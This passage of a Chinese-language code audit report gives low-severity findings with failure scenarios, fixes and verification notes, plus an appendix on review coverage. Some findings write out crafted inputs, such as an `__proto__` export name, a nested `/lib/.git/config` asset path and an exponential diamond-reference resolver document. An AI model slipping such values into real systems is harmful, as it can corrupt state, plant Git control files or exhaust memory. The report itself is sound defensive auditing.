##### L-SI-03 normalizePIR 让 PIR 文档经由 map[string]any 往返,静默破坏种子 Workspace 与已发布投影中的数值

- **位置**: [`apps/backend/internal/modules/project/store_helpers.go:32`](apps/backend/internal/modules/project/store_helpers.go#L32)
- **类别**: data-integrity ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-auth-project-env`

**详情**: `normalizePIR` 先校验原始文档,然后把它解码为 `map[string]any` 并重新序列化。当目标类型为 `any` 时,`encoding/json` 会把每一个 JSON 数字解码为 `float64`,因此被持久化的字节与被校验的字节并不相同。它在两条写入路径上都会执行:`HandleCreateProject`(handlers.go:84)把其结果用作初始的 canonical Workspace PIR 文档;`ProjectStore.PublishWorkspaceProjection`(store.go:144)在写入 `published_pir_json` 之前,对从 canonical Workspace 读出的 PIR 再执行一遍。因此发布投影并不是创作文档的忠实投影。

**失败场景**: 一份 PIR 文档含有诸如 `{"externalId": 9007199254740993}` 的节点 prop,它通过了 `pircontract.ValidateDocument`,被解码为 float64 的 `9007199254740992`,随后被重新序列化并以 `9007199254740992` 存储——在 canonical Workspace 和社区可见的 `published_pir_json` 中都是一个被静默改错的值。超出 float64 范围的值(例如 `{"scale": 1e400}`)更糟:它能通过 schema 校验,但 `json.Unmarshal` 到 `map[string]any` 会失败,于是 `HandleCreateProject` 对一份契约 schema 已接受的文档回应 `422 PIR-4001 "PIR document is invalid."`。

**修复建议**: 使用带 `UseNumber()` 的解码器(或对已校验的原始字节使用 `json.Compact` 做规范化),使数字字面量在往返中原样保留;并在 `workspace.ensureComponentPIRDocument` 中复用同一原语,该处存在完全相同的 map[string]any 往返。

**验证备注**: 证据与 store_helpers.go:29-36 逐字吻合,且对语言语义的理解是正确的而非误读。jsonschema/v6 的 loader.go:255 UnmarshalJSON 明确调用了 decoder.UseNumber(),因此校验阶段保留了完整数值精度;随后 json.Unmarshal 到 map[string]any 会把每个数字解码为 float64,因此持久化的字节与被校验的字节不同。schema 确实允许这类值:$defs/elementNode 的 props -> pirValueBinding -> {kind:'literal', value: $defs/jsonValue},而 jsonValue 允许无约束的 'number',因此 {"kind":"literal","value":9007199254740993} 可通过校验并被存为 9007199254740992。1e400 的情形也正确——json.Number 能通过 schema 校验,但 encoding/json 拒绝把它解码为 float64,于是对一份 schema 合法的文档产生 422 PIR-4001。两条写入路径均已确认:HandleCreateProject(handlers.go:84)和 ProjectStore.PublishWorkspaceProjection(store.go:143)。严重级别由 medium 下调为 low:该往返仅限于项目初始种子和发布投影(真正的创作写入路径是 workspace commit 处理器,它们不调用 normalizePIR),而且触发它需要超过 2^53 的整数或超出范围的浮点数,编辑器并不会产出这类值。

#### 4.4.14 状态完整性(state-data-integrity)

##### L-SI-04 decodeServerRuntimeProfile 用 `functionsByExport[exportName] = entry` 写入导出条目,因此名为 `__proto__` 的导出会静默替换该映射的原型,而不是注册函数

- **位置**: [`packages/server-runtime/src/serverRuntimeProfile.ts:288`](packages/server-runtime/src/serverRuntimeProfile.ts#L288)
- **类别**: state-data-integrity ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-server-assets-tokens`

**详情**: `functionsByExport` 是一个普通的 `{}` 字面量,而 `isExportName` 接受 `__proto__`(它匹配 `/^[A-Za-z_$][A-Za-z0-9_$]*$/u`)。执行 `functionsByExport['__proto__'] = entry` 会调用 `Object.prototype.__proto__` 的 setter:不会创建任何自有属性,该映射的 `[[Prototype]]` 变成 `entry`,而对结果调用 `Object.keys`/`Object.entries`/`JSON.stringify` 看到的都是一个空对象(已用 node 验证:`ownKeys []`、`json {}`,但通过原型链 `o['a'] === 1`)。解码器仍然返回 `status: 'valid'`。写入路径可由用户输入到达:`createWorkspacePermissionGuardTransactionPlan`(packages/workspace/src/workspaceServerRuntimeAuthoring.ts:548)用同样宽松的正则校验调用方提供的 `exportName`,随后调用 `writeServerRuntimeProfile`。profile 字面量本身是安全的(计算属性键会定义自有属性);损坏只发生在这里。

**失败场景**: 用户以 `exportName: '__proto__'` 创建一个 workspace-owner 路由守卫。`permissionGuardProfile` 构造出 `{functionsByExport:{__proto__: entry}}`(自有属性)。`writeServerRuntimeProfile` -> `decodeServerRuntimeProfile` 返回 'valid',但其 `functionsByExport` 没有任何自有键,因此持久化的 Code artifact 元数据序列化为 `"functionsByExport":{}`。守卫被提交,却没有对应的 profile 条目:`resolveServerFunctionDefinition` 返回 undefined,`readIsolatedServerFunctionPlan` 拒绝该计划,用户刚刚编写的路由守卫永远不会运行。之后重新保存该 artifact 会抛出 `Server runtime profile must contain 1-128 functions.`,因为重新解码时看到的是一个空映射。此外,`entry` 的每一个自有键(`kind`、`adapterId`、`auth`、`inputSchema` 等)都会经由原型链变成可解析的幽灵导出名。

**修复建议**: 用 `Object.create(null)` 构建该映射(或改用 `Object.defineProperty` / 一个 `Map`),让 `__proto__` 成为普通键;并且/或者在 `isExportName` 中显式拒绝 `__proto__`、`constructor` 和 `prototype`。

**验证备注**: 该 JS 机制真实存在,我已针对实际包做了验证:一个 vitest 探针调用 `decodeServerRuntimeProfile({'prodivix.serverRuntime':{schemaVersion:'1.0',functionsByExport:{['__proto__']:entry}}},'ts')` 返回 STATUS valid,同时 `Object.keys(functionsByExport) === []`,`JSON.stringify` 为 `{"schemaVersion":"1.0","functionsByExport":{}}`;`writeServerRuntimeProfile` 也返回了同样的空元数据且未抛错。因此第 288 行确实触发了 `Object.prototype.__proto__` 的 setter,解码器在违反自身文档化的 1-128 函数不变式的情况下仍返回 'valid'。但所述的失败场景在可达性和后果两方面都不成立。(a)没有任何生产调用方提供 `exportName`:仅有的应用层调用点(apps/web/.../useBlueprintEditorInspectorController.ts:743 与 :777)都省略了它,因此始终使用预设默认值 `requireWorkspaceOwner`/`requireWorkspaceRead`;source-mutation 与 read-secret 预设同理。(b)我仍然强制构造了该情形:在 packages/workspace/src/workspaceServerRuntimeAuthoring.test.ts 中加入探针调用 `createWorkspaceOwnerGuardTransactionPlan({... exportName:'__proto__'})`,结果为 `{status:'rejected', code:'WKS_SERVER_RUNTIME_ARTIFACT_UNSUPPORTED', message:'Command result failed workspace validation.'}` —— `applyWorkspaceCommand` 会通过 `isWorkspaceCodeDocumentContent`(workspaceCodeDocument.ts:50)重新校验暂存的代码文档,重新解码那个已经变空的映射并判定为无效。什么都不会被提交,守卫也从未被绑定,因此“守卫被提交却从不运行”被推翻;系统是失败关闭的。下游消费者同样失败关闭:`readIsolatedServerFunctionPlan`(isolatedServerRuntime.ts:284-302)在触及 `definition.auth` 之前就先在 `definition.adapterId === ...` 处短路,而 Go 网关会独立地重新校验原始 JSON(server_function_gateway.go:432-441),那里 `__proto__` 只是一个普通的 map 键。严重级别由 high 修正为 low:这是一个真实的解码器健全性/加固缺口(应当拒绝 `__proto__`/`constructor`,或改用空原型映射),但没有可达的生产输入,也不会造成数据损坏。

#### 4.4.15 路径安全(path-safety)

##### L-PS-01 normalizeGitPath 只在投影根部拦截 `.git`,因此带有嵌套 `.git` 段的资源路径会被投影成 Git 拒绝索引的检出文件

- **位置**: [`packages/assets/src/binaryAssetGitProjection.ts:88`](packages/assets/src/binaryAssetGitProjection.ts#L88)
- **类别**: path-safety ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-server-assets-tokens`

**详情**: 逐段守卫会拒绝空段、`.`、`..`、`.gitattributes`、以点或空格结尾的段以及 Windows 保留段,但不会拒绝 `.git`。`.git` 守卫只作用于拼接后的完整路径(`lowerPath === '.git' || lowerPath.startsWith('.git/')`),因此位于任何非根位置的 `.git` 都能通过。该函数是 Git 投影唯一的路径安全关卡:它返回的一切都会作为 `BinaryAssetGitProjectionFile` 由适配器写入工作树。

**失败场景**: 某资源被编写在路径 `/lib/.git/config`。`normalizeGitPath` 返回 `lib/.git/config`(段 `.git` 不在逐段黑名单中,而 `lowerPath` 以 `lib/` 而非 `.git/` 开头),于是 `createBinaryAssetGitProjection` 返回 `status: 'ready'`,包含该路径的文件且没有 AST-1204 诊断。Git 适配器写入该文件后,`git add` 以 `error: invalid path 'lib/.git/config'` 失败,导致整个投影提交中止,且没有任何逐资源的诊断能指出出问题的资源;而在暂存前先落盘的适配器还会额外埋下一个嵌套仓库标记(`.git/hooks/*` 也可以用同样方式到达)。

**修复建议**: 把 `segment.toLowerCase() === '.git'`(出于同样原因还有 `.gitmodules`)加入逐段黑名单,使嵌套的 Git 控制路径像其他不安全路径一样以 AST-1204 被拒绝。

**验证备注**: 证据与 packages/assets/src/binaryAssetGitProjection.ts:88-101 完全吻合,该缺口真实存在。追踪 `/lib/.git/config`:分段为 ['lib','.git','config'];'.git' 非空,不是 '.'/'..',小写后为 '.git' 而不等于 '.gitattributes',不匹配 /[. ]$/(以 't' 结尾),也不匹配 Windows 保留名正则——因此它通过了逐段黑名单。拼接后的路径 'lib/.git/config' 又未通过第 107-108 行的两项根部检查(`lowerPath === '.git'` 与 `startsWith('.git/')`),于是 normalizeGitPath 返回它,createBinaryAssetGitProjection 生成一个 BinaryAssetGitProjectionFile 且没有 AST-1204。这种不对称是可证明的:同类保留名 `.gitattributes` 是被逐段拦截的,packages/assets/src/binaryAssetGitProjection.test.ts:251-274 的现有测试明确断言 '/nested/.gitattributes' 被拒绝,而嵌套 '.git' 的用例毫无覆盖。上游也无法兜底:`path` 的唯一来源是 WorkspaceSnapshot 的 document.path(packages/prodivix-compiler/src/export/workspaceGitAssetProjection.ts:32-44),而 Workspace 节点名校验(packages/workspace/src/workspaceVfsIntent.ts:60-63)只拒绝空名/'.'/'..'/含斜杠的名字——'.git' 是允许的目录名。对审查者叙述的两处更正。(a)所述失败方式对真实适配器是错误的:apps/web/src/infra/git/browserGitClient.ts:314-319 使用 isomorphic-git 的 git.add,它并未实现 C 版 git 的 verify_path,而 writeWorkingFileBytes(第 298 行)同样不做任何路径检查——因此投影并不会以 'error: invalid path' 中止;它会静默地把 lib/.git/config 写入 LightningFS 工作树并暂存,产生一棵真实 git 之后拒绝检出的提交树。后果是仓库被静默污染,而不是一次响亮的中止。(b)可达性:`git grep` 显示 createWorkspaceGitAssetProjection 与 applyBrowserGitAssetProjection 在仓库中没有任何非测试调用方(只有 packages/prodivix-compiler/src/export/workspaceGitAssetProjection.test.ts 和 apps/web/src/infra/git/browserGitAssetProjection.test.ts,以及索引再导出)。今天没有任何 UI/CLI 流程会到达它。这是公共导出中真实、可证的清洗器缺口,但不在任何活跃路径上——严重级别由 medium 修正为 low。

#### 4.4.16 效率(efficiency)

##### L-EFF-01 expandSources 在每条路径上都重新展开共享的集合引用,因此一个很小的无环 resolver 文档会指数级膨胀

- **位置**: [`packages/tokens/src/designTokenResolutionPlan.ts:49`](packages/tokens/src/designTokenResolutionPlan.ts#L49)
- **类别**: efficiency ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-server-assets-tokens`

**详情**: `expandSources` 为每个分支克隆 `visiting` 集合(`new Set(visiting).add(setName)`),这正确地限制了环,却没有任何记忆化:同一个集合若可经由 N 条不同路径到达,就会被展开 N 次,并把它的叶子节点向 `output` 推入 N 次。由于 `decodeDtcgDesignTokenResolverDocument` 只拒绝*环*(validateReferences/`findCycleNodes`),菱形结构的 DAG 能通过解码,然后在这里爆炸。该输出数组同时也是计划的 `orderedSources`,因此膨胀不仅体现在时间上,还会在内存中真实展开。

**失败场景**: 一个约 2 KB 的 resolver 文档声明了集合 `s0..s29`,其中每个 `sI.sources` 为 `[{"$ref":"#/sets/s(I+1)"},{"$ref":"#/sets/s(I+1)"}]`,`s30.sources` 是一个内联 token 对象,`resolutionOrder` 引用 `s0`。`decodeDtcgDesignTokenResolverDocument` 返回 ok(无环),随后 `createDesignTokenResolutionPlan` 递归 2^30 次,并向 `orderedSources` 推入约 10^9 个条目,阻塞调用线程并耗尽内存。今天只有测试调用这个导出 API,但它属于该包的公共接口(packages/tokens/src/index.ts:15)。

**修复建议**: 按集合名做记忆化(集合在任一无环路径上展开一次后即缓存其扁平化的 source 列表),或者对展开的 source 总数设置显式上限,超出时发出一条解析 issue 而不是无界增长。

**验证备注**: 引用与 packages/tokens/src/designTokenResolutionPlan.ts:49-57 完全吻合,分析成立。expandSources 为每个分支克隆 `visiting`,因此该集合只限制路径长度,从不限制宽度,而且没有以 setName 为键的记忆化——一个可经 N 条不同路径到达的集合会被重新展开 N 次,其叶子被推入 `output` N 次。我验证了解码器并不能阻止这一点:packages/tokens/src/dtcgDesignTokenResolverCodec.ts:788-819 的 validateReferences 构建集合图并用 `visiting` 和 `visited` 双重标记做 DFS 遍历(第 801 行:`if (visited.has(name)) return;`),因此解码本身是线性的,只通过 referenceCycle 标记真正的环——菱形 DAG 解码通过,然后在计划阶段爆炸。对 dtcgDesignTokenResolverCodec.ts 做 `git grep` 搜索 max/limit 显示,集合数量、每集合 source 数或嵌套深度都没有上限。算术也对得上:每个 sI.sources = [ref s(I+1), ref s(I+1)] 时 T(I) = 2*T(I+1),故 T(0) = 2^30 次递归展开,并全部在 orderedSources 中物化。可达性支持审查者自己给出的 'low':design-token-resolver 确实是用户可编写的 Workspace 文档类型(通过 apps/web/src/editor/features/resources/DesignTokenResourcePage.tsx 编辑),但生产代码只调用 decodeDtcgDesignTokenResolverDocument——createDesignTokenResolutionPlan 没有任何非测试调用方(仅 packages/tokens/src/dtcgDesignTokenResolverCodec.property.test.ts 和 packages/workspace/src/workspaceDesignTokenResolverDocument.property.test.ts),因此这是公共导出中的潜在 DoS,而非现实生效的 DoS。所声明的 'low' 成立。

#### 4.4.17 输入校验(input-validation)

##### L-IV-01 build profile 的 artifact 元数据未经规范化就从不可信 sandbox 直接透传

- **位置**: [`apps/remote-runner-worker/src/rootlessPodmanSandbox.ts:1162`](apps/remote-runner-worker/src/rootlessPodmanSandbox.ts#L1162)
- **类别**: input-validation ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-runner-worker`

**详情**: `decodeRootlessPodmanSandboxResult` 对除 build 之外的每个 profile,都会用可信的宿主状态重建 `publishedMetadata`:文件系统 diff(第 1098 行)、Server Function 结果(第 1130 行)、预览产物包(第 1148 行)和测试报告(第 1214 行)都会覆盖它。而 `profile === 'build'` 分支只校验解码后 bundle 内的 `artifactId`、`mediaType`、`snapshotDigest` 和 `target`,把 `publishedMetadata` 原封不动地保留为 sandbox 产生的原始 `stringRecord(artifact.metadata ?? {})`——最多 32 个任意键、每个值最长 4096 个字符,其中包括自有的 `__proto__` 键(`stringRecord` 辅助函数从值本身派生其允许键集合,因此 `exactRecord` 的未知字段拒绝在这里形同虚设)。而该函数自己的文档注释却写着它会“Canonicalizes an untrusted sandbox result”。

**失败场景**: 一个入口被颠覆的 sandbox 返回一个合法的 build bundle,外加 `metadata: {"snapshotDigest":"<correct digest>","fileCount":"999999","unpackedBytes":"0","__proto__":"x"}`。宿主原样接受,`workerAgent` 将其复制进 artifact 描述符,该值随即成为持久的执行遥测数据,而 Build 使用方(`remoteExecutionProvider.ts`,只检查 `metadata?.snapshotDigest`)会把它当作可信的 provider 派生事实。

**修复建议**: 在 build 分支中,完全照预览分支的做法用宿主可信值重建 `publishedMetadata`——`{ format: buildBundle.format, snapshotDigest: snapshot.contentDigest, presetId: snapshot.target.presetId, fileCount: String(buildBundle.files.length), unpackedBytes: String(各文件 size 之和) }`——并显式设置 `publishedLabel`,而不是接受 sandbox 提供的值。

**验证备注**: 代码与引用一致:rootlessPodmanSandbox.ts:1162 是 `if (profile !== 'build')`,build 分支(1162-1177)只校验 artifactId/mediaType/buildBundle.snapshotDigest/target,而把 `publishedMetadata` 保留为第 1081 行产生的原始 `stringRecord(artifact.metadata ?? {})`。所有同级分支都会覆盖它(diff 1098、Server Function 1130、预览 1148、测试 1214),因此这种不对称是真实的。`stringRecord`(641-662)确实从值本身派生允许键集合(第 647 行的 `Object.keys(value)`),所以 exactRecord 的未知字段拒绝在这里形同虚设;rootlessPodmanSandbox.test.ts:588 处的现有测试通过接受 build 的 `metadata: { fileCount: '1' }` 证明了透传。但那些加重因素并不成立,因此严重级别降为 low:(1) **proto** 这一角度是惰性的——下游 codec 用 Object.fromEntries 重建记录(remoteExecutionCodecPrimitives.ts:119),它使用 CreateDataProperty,而 workerAgent.ts:644 传递的是引用,没有展开或 Object.assign,因此不存在可达的原型污染;(2) 机密泄露已被覆盖——rootlessPodmanSandbox.ts:1566 对元数据也运行了 outputGuard.inspectValue('artifact-content', result.artifacts);(3) 唯一承重的键确实经过校验——remoteExecutionProvider.ts:516 会拒绝 metadata.snapshotDigest !== record.snapshotDigest 的 build artifact;(4) 引用的文档注释归属错误——'Canonicalizes an untrusted sandbox result' 位于 serverFunctionArtifact.ts:144 的另一个函数上,而 decodeRootlessPodmanSandboxResult(第 918 行)没有文档注释;(5) 可达性需要入口点被完全颠覆,因为 sandbox/entry.mjs:526 自行计算 build 元数据,且 build 子进程以 stdio ['ignore','pipe','pipe'] 运行(entry.mjs:240)。综合来看:这是一个真实的纵深防御缺口,会污染有界的纯字符串遥测数据,但不构成数据损坏或机密暴露。

#### 4.4.18 构建配置(build-config)

##### L-BC-01 apps/web 完全没有未使用代码与 hook 依赖检查:tsc 与 ESLint 两道守卫对这些类别都被关闭

- **位置**: [`apps/web/eslint.config.js:21`](apps/web/eslint.config.js#L21)
- **类别**: build-config ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `infra-gates`

**详情**: `apps/web` 是仓库中唯一的 React 界面层,也是唯一真正被 lint 的包,但它的 flat 配置关闭了所有能捕获死代码和 hook 依赖缺陷的规则类别:`@typescript-eslint/no-unused-vars`(第 21 行)、`react-hooks/exhaustive-deps`(第 26 行),以及 `set-state-in-effect`、`static-components`、`preserve-manual-memoization` 和 `immutability`(22-25 行)。相应的编译器检查同样被关闭 —— `apps/web/tsconfig.json:6-7` 设置了 `noUnusedLocals: false` 与 `noUnusedParameters: false`,覆盖了基础配置。最终结果是:在这个 688 个文件的编辑器界面层中,`pnpm run lint` 和 `pnpm --filter @prodivix/web typecheck` 都无法报告任何未使用的 import/局部变量或缺失的 effect 依赖。

**失败场景**: 在任意编辑器界面中加入 `useEffect(() => { load(projectId); }, [])`:缺失的 `projectId` 依赖会造成陈旧闭包,导致导航之后仍持续加载第一个项目,而 .github/workflows/tests.yml 中的 `Lint` 与 `Type check web` 两个步骤都不会报告任何问题。同样的缺陷若出现在一个假设中被正常 lint 的包里,会被 `react-hooks/exhaustive-deps` 捕获 —— 该规则由第 19 行的 `reactHooks.configs.recommended` 启用,随后又在第 26 行被显式关闭。

**修复建议**: 至少以 `'warn'` 级别重新启用 `@typescript-eslint/no-unused-vars`(配合 `argsIgnorePattern: '^_'`)和 `react-hooks/exhaustive-deps`,并对新增代码使用 `--max-warnings=0`;同时在 `apps/web/tsconfig.json` 中恢复 `noUnusedLocals`/`noUnusedParameters`。

**验证备注**: 通过实证验证,而非仅阅读配置。apps/web/eslint.config.js 第 21 行是 `'@typescript-eslint/no-unused-vars': 'off'`,22-25 行关闭了 set-state-in-effect/static-components/preserve-manual-memoization/immutability,第 26 行是 `'react-hooks/exhaustive-deps': 'off'`,全部位于第 18 行 `...reactHooks.configs.recommended.rules` 展开之后。apps/web/tsconfig.json 第 6-7 行设置 noUnusedLocals:false 与 noUnusedParameters:false,覆盖了将两者设为 true 的 tsconfig.base.json;apps/web 的 `typecheck` 是针对该 tsconfig 运行 `tsc -b --pretty false`,因此覆盖生效。为排除对 typescript-eslint 扩展规则处理方式的误读,我在 apps/web/src 下写入了一个探测文件,内含一个未使用的模块级 const 以及 `export function useProbe(projectId: string) { useEffect(() => { console.log(projectId); }, []); }`,然后运行 `pnpm --filter @prodivix/web exec eslint src/__lintprobe.ts`:输出完全为空 —— 既没报告未使用的局部变量,也没报告缺失的 `projectId` 依赖。(第一次命名为 `probe` 的探测确实触发了 react-hooks/rules-of-hooks,证明插件已加载并生效,所以这种静默来自被关闭的规则,而不是配置解析失败。)探测文件事后已删除;`git status --porcelain apps/web/src` 显示没有残留。该结论中有两处不准确:apps/cli/package.json:11 和 apps/vscode/package.json:53 同样定义了 `lint` 脚本,因此 apps/web 并非“唯一真正被 lint 的包”;而且引用的 `:19` 锚点实际指向的展开语句位于第 18 行。严重程度修正为 low:这是 alpha 阶段仓库中一项刻意的 lint 严格度策略,它削弱了质量守卫,但不会破坏数据、泄露机密,也不违反任何 AGENTS.md 架构不变量。

#### 4.4.19 CI 覆盖(ci-coverage)

##### L-CI-01 为 Blueprint 编辑器配置的覆盖率阈值从未被任何 CI 作业强制执行

- **位置**: [`apps/web/vitest.config.ts:23`](apps/web/vitest.config.ts#L23)
- **类别**: ci-coverage ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `infra-gates`

**详情**: `apps/web/vitest.config.ts` 声明了按路径划分的覆盖率阈值(`src/editor/features/blueprint/**` 的语句/行 80%,分支/函数 60%)。Vitest 只有在传入 `--coverage` 时才会评估 `coverage.thresholds`。唯一这样做的脚本是 `test:web:coverage`,而把所有根脚本与 `.github/workflows` 交叉比对后可以看出,没有任何工作流调用它:`tests.yml` 运行的是 `pnpm --filter @prodivix/web test:ci`,即不带 coverage 的 `vitest --run --maxWorkers=1`。因此这道配置好的守卫从未执行。

**失败场景**: 某次删除了测试的重构使 Blueprint 编辑器的语句覆盖率从 80% 降到 40%;`pnpm run test` 和 CI 的 `Test web` 步骤都会通过,而配置的阈值不会产生任何信号,因为 CI 从不收集覆盖率。

**修复建议**: 要么在 `.github/workflows/tests.yml` 的 `frontend` 作业中运行 `pnpm --filter @prodivix/web test:coverage`,要么移除这些阈值,以免配置暗示存在被强制执行的下限。

**验证备注**: 已直接在源码中核实。apps/web/vitest.config.ts:23-30 包含所引用的针对 `src/editor/features/blueprint/**` 的按路径 `thresholds` 块(statements 80、branches 60、functions 60、lines 80),嵌套于 `test.coverage` 之下,而 vitest 只在启用覆盖率收集时才会评估它。在整个仓库执行 `git grep -- "--coverage"` 恰好返回一个结果:apps/web/package.json:15 的 `test:coverage`,由根 package.json:89 的 `test:web:coverage` 包装。`git grep -n coverage -- .github/` 在全部 17 个被跟踪的工作流中返回零结果,`ls .github/workflows` 也显示没有未跟踪的额外文件。.github/workflows/tests.yml:48 运行 `pnpm --filter @prodivix/web test:ci`,而 apps/web/package.json:13 将 test:ci 定义为 `pnpm run typecheck && vitest --config vitest.config.ts --run --maxWorkers=1` —— 没有 --coverage。仓库中没有 husky/lint-staged/pre-commit 钩子(均未被跟踪),也没有添加覆盖率的 turbo 任务。因此可以证明这道守卫在 CI 中从未执行。所有反驳尝试均告失败:没有隐藏的工作流,没有基于环境变量的启用方式,配置中也没有 `coverage.enabled: true`。唯一的缓解事实是,另一处引用 apps/web/README.md:103 仅把 `pnpm test:web:coverage` 列为本地开发命令,没有任何规范或文档声称 CI 会强制执行覆盖率 —— 因此这属于配置未被强制执行/可观测性缺口,而非守卫被破坏或代码缺陷。声明的 `low` 严重程度是正确的上限。

---

## 5. 附录:各审查单元覆盖范围与结构观察

本节记录每个审查单元实际读取了什么,以及审查者认定为**健康、无需重复审计**的部分。负面结论(「查过且是对的」)与发现同样重要,可避免下一轮重复投入。

### 5.1 `web-blueprint` — apps/web Blueprint editor

**覆盖范围**: 通过 `git ls-files` + `git status` 枚举了 apps/web/src/editor/features/blueprint 下的全部 184 个已跟踪文件与 7 个未跟踪文件,随后完整阅读了:两个 controller(useBlueprintEditorController.ts 1107 L、useBlueprintEditorInspectorController.ts 1615 L)、blueprintCanonicalGraph.ts、useBlueprintCanonicalDragDrop.ts、useWorkspaceSaveIndicator.ts、BlueprintEditor.tsx、BlueprintEditorCanvas.tsx 及 canvasGeometry/routeDiagnostics/useActiveRoutePreview、model/tree.ts、model/composition.ts、model/paletteCreation.ts、model/blueprintText.ts、nesting.ts、componentTree/{BlueprintEditorComponentTree,BlueprintTreeNode}.tsx、authoring/{ComponentExtractionDialog,blueprintEntryDocument}、整个 Inspector 界面(BlueprintEditorInspector、CollectionInspectorPanel、projection/{readProjection,bindingProjection,types}、domain/{collectionInspectorModel,componentInstanceInspectorModel}、fields/{InspectorNodeIdentityFields,InspectorComponentPropsFields,InspectorDataScopeFields}、fields/triggers/{triggerAuthoring,useTriggerDraftAuthoring,InspectorTriggerItem,TriggerNavigateFields}、panels/TriggersPanel + layoutGroup/layoutPanelHelpers、components/{UnitInput,classProtocol/ClassProtocolEditor,classProtocol/engines/tailwind4ClassEngine})、runner/{blueprintProjectNetworkBridge,blueprintProjectRunnerClient,useBlueprintProjectRunner,BlueprintProjectRunnerSurface}、assistant/{BlueprintAssistantPanel,BlueprintAssistantSettingsModal}、sidebar/SidebarComponentList、palette/projectionResolver.ts、layoutPatterns/{registry,presets/utils}。为确认每一项发现,还与分区外的所有者代码交叉核对了行为:packages/pir 的 mutations(movePirGraphSubtree 的索引补偿、pirValidator 的生命周期规则)、packages/workspace(workspacePirGraphAuthoringTransaction 的 patch 形状、WorkspaceCommandEnvelope/TransactionEnvelope 不含 base-revision 字段)、packages/router(flattenRouteManifest 的根节点排除、getNavigateLinkKind)、packages/pir-react-renderer(PIRRenderer 的 blocking-issue memo 化、PIRElementProjection 的 prop 展开)、packages/prodivix-compiler 的 codegenPolicy,以及 apps/web/src/editor/{store/editorStore.workspaceSlice,workspaceSync/_}。未深入覆盖:tailwind4.catalog.json / tailwind.runtime.snapshot.json(生成数据)、catalog/groups/_ 的预览 JSX(纯展示)、IconPickerModal、GridGroup/FlexGroup/SizeGroup/SpacingControl 的实现主体(仅粗读),以及 _.test._ 文件(粗读以还原其预期语义 —— 没有一个违反 DOM 耦合测试策略,不过 InspectorTriggerItem.test.tsx 只覆盖了外部目标与空目标,这也是发现 1 未附带测试的原因)。

**结构观察**: 两个结构性模式解释了我发现的绝大部分问题。(1) snapshot 新鲜度的处理并不一致:`useBlueprintEditorInspectorController` 在每次规划前都会重新读取 `useEditorStore.getState().workspace`(共 8 处调用点),而 `useBlueprintEditorController` 在其全部六条变更路径中都基于 React render 闭包进行规划。由于每一条 PIR authoring command —— 无论是 paletteCreation.ts 中手写的,还是 workspacePirGraphAuthoringTransaction.ts 中由 `completePlan` 生成的 —— 都是对整个 `/ui/graph` 的 `replace` 且在 apply 时不做 revision 检查,过期的计划会静默回退自上次 render 以来已应用的内容,而不是 fail closed。规划期的 `baseRevision` 守卫只是把 planner 的输入与其自身比较,因此无法捕获这种情况。这一点值得在 workspace 包层面做一次有意识的决策(采用定向 patch 操作,或在 envelope 上增加 `expectedContentRev`),而不是逐个调用点去修。(2) Inspector 中 draft 与 canonical 的纪律是各组件各自为政而非共享的:`CollectionInspectorPanel`、`UnitInput` 和 `useTriggerDraftAuthoring` 各自发明了自己的守卫,而 `InspectorDataScopeFields` 完全没有。一个统一的 `useCanonicalDraft(value, {commitOn})` hook 就能消除这一类缺陷。另有两项价值较低、我没有作为发现提出的观察:若干 Inspector 输入(InspectorNodeIdentityFields 中的 `PdxInput.onValueChange`、CollectionInspectorPanel 中的 `changeLiteralSource`)会为每一次按键派发一条可逆 transaction 和一条持久 outbox 条目,这会让 undo 历史和 outbox 在任何真实的文本编辑中都变得不可用;以及把 Collection 的 source 从 `data-operation` 切回 `literal`(BlueprintEditorInspector.tsx:189)会剥离 `lifecycle`,却把此时已无引用的 `logic.dataById` 条目留在文档里 —— `pirValidator.ts:957` 只强制 lifecycle→dataById 方向而不校验反向,因此校验能通过,但会不断累积垃圾。runner/bridge 代码(blueprintProjectNetworkBridge.ts、blueprintProjectRunnerClient.ts)是该分区中最扎实的部分:origin 围栏、frame 身份围栏、provider 门控、通过 `startupTail` 实现的单活跃任务串行化,以及取消的终态等待都处理得很谨慎,我在那里没有发现可报告的问题。

### 5.2 `web-store-sync` — apps/web editor store + workspaceSync

**覆盖范围**: 完整阅读了该分区中的全部生产代码:apps/web/src/editor/store/{useEditorStore.ts, editorStore.shape.ts, editorStore.types.ts, editorStore.workspaceSlice.ts, editorStore.workspaceSyncSlice.ts, editorStore.blueprintSlice.ts, editorStore.projectSlice.ts, editorStore.routeSlice.ts, editorStore.selectors.ts, useSettingsStore.ts} 以及 apps/web/src/editor/workspaceSync/{WorkspaceOutboxEffects.tsx, workspaceOutboxExecutor.ts, workspaceSettingsOutboxExecutor.ts, workspaceSettingsOutboxAdoption.ts, workspaceRemoteSnapshotAdoption.ts, workspaceConflictResolutionExecutor.ts, workspaceConflictResolutionPreparation.ts, workspaceRevisionRecovery.ts, workspaceRevisionConflictApi.ts, workspaceLocalReplica.ts, workspaceAuthoringOperationDispatcher.ts, workspaceHistoryOperationDispatcher.ts, workspaceVfsOutboxExecutor.ts, localProjectWorkspaceOutbox.ts, indexedDbCausalOutboxStore.ts, indexedDbWorkspaceOutboxStore.ts, indexedDbWorkspaceSettingsOutboxStore.ts, indexedDbWorkspaceLocalReplicaStore.ts, workspaceOutboxSignals.ts, workspaceOperationIdentity.ts}。

粗读了该分区的全部 10 个测试文件以还原其预期语义;没有一个违反测试策略(无 querySelector/closest/parentElement/snapshot 断言,也没有无断言的测试)。有两处覆盖缺口被我用作发现的佐证:workspaceConflictResolutionExecutor.test.ts:195 走了 null-operation 路径却没有对 outbox store 作断言;localProjectWorkspaceOutbox.property.test.ts 从未让 snapshot 经 workspace codec 完成一次往返。

